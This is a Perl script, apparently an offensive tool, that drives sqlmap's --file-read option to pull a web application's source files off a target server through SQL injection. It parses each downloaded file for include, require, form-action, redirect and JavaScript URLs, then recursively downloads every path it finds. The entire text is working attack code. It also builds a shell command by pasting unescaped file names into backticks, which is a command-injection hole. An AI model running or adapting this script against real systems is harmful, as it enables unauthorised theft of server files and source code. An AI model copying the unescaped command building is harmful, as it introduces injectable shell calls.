#!/usr/bin/perl -w

use File::Basename;
use File::Path   qw/mkpath/;
undef $/;

$sqlmap_args=shift @ARGV;

$webroot=shift @ARGV;

push @files,shift @ARGV;

while (@files) {
	
	$fpath=download_file(pop @files);

	if($fpath)  {

		open FILE , "$fpath";

		$fcontents = <FILE>;
		
		close FILE;

		@new_files = $fcontents =~ /

		require[\s_(].*?['"](.*?)['"]
		|include.*?['"](.*?)['"]
		|load\("(.*?)["?]
		|form.*?action="(.*?)["?]
		|header\("Location:\s(.*?)["?]
		|url:\s"(.*?)["?]
		|window\.open\("(.*?)["?]
		|window\.location="(.*?)["?]
	       /xg;


		for $file (@new_files) {

			next unless $file;
			if($file =~/^\//) {

				$file="output/$webroot/$file";


			}#if

			else {

				$file = dirname($fpath)."/".$file;

			}#else

		

			next if -e $file;
			$file=~ s/^output//;

			print "[+] adding $file to queue ...\n";

			push @files , $file;



	}

}#end while
}

sub download_file {

	$fname=shift;
	`sqlmap $sqlmap_args --file-read='$fname' --batch`=~ /files saved to .*?(\/.*?)\(same/s;
	return unless $1;

	mkpath ("output".dirname $fname);

	rename($1,"output$fname");

	print "[+] downloaded $fname \n";

	return "output$fname";

}
